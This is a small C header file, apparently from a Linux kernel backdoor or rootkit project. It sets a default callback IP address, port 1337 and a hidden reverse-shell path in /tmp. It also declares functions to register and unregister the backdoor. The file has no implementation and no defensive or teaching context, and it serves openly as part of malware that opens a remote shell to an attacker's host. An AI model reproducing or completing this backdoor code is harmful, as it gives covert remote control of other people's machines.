#ifndef _NF_H
#define _NF_H

#define DEFAULT_IP "192.168.103.109"
#define DEFAULT_PORT "1337"
#define DEFAULT_RSHELL_PATH "/tmp/.shell"

int register_backdoor(const char *ip, const char *port,
		      const char *shell_path);
void unregister_backdoor(void);

#endif
